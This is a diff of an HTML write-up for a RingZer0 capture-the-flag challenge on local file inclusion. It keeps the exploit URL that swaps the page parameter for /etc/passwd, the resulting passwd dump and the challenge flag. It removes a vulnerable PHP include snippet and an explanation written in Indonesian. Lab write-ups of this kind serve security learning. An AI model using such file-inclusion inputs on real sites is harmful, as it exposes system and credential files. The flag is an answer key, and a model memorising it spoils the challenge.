@@ -1,27 +1,9 @@
-<h1><b>Looking for password file</h1></b>
-<pre>
+<h1>Looking for password file</h1>
+<h3>Description</h3>
+<label>
 http://challenges.ringzer0team.com:10075/?page=lorem.php
-</pre>
-</b><h3>Solution</h3></b>
-<p align='justify'>Diberikan sebuah URL website <u>http://challenges.ringzer0team.com:10075/?page=lorem.php</u> yang sepertinya berupa challenge LFI (local file inclusion) yang mana
-penyerang dapat melihat seluruh akses direktori dari sebuah halaman website dan yang lebih parah lagi melihat file sensitif seperti file passwd linux</p>
-<p align='justify'>Pada URL kita tinggal mengganti lorem.php dengan /etc/passwd. yang otomatis browser membaca file tersebut, dan script php yang memungkinkan dari
-kelemahan tersebut seperti dibawah ini</p>
-
-```php
-<?php 
-$file = $_GET['page'];
-if(isset($file))
-{	
-	include("$file");
-}
-else
-{
-	include("index.php");	
-}
-?>
-```
-<p>Perhatikan requests method GET dan include() disana terdapat kelemahan yang attacker dapat dengan mudah mengakses semua dirktori dan file target</p>
+</label>
+<h3>Solution</h3>
 <u>http://challenges.ringzer0team.com:10075/?page=/etc/passwd</u>
 <pre>
 root:x:0:0:root:/root:/bin/bash
@@ -46,7 +28,7 @@ libuuid:x:100:101::/var/lib/libuuid:
 sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
 syslog:x:102:105::/home/syslog:/bin/false
 </pre>
-</b><h3>Flag</h3></b>
+<h3>Flag</h3>
 <pre>
 FLAG-zH9g1934v774Y7Zx5s16t5ym8Z
 </pre>
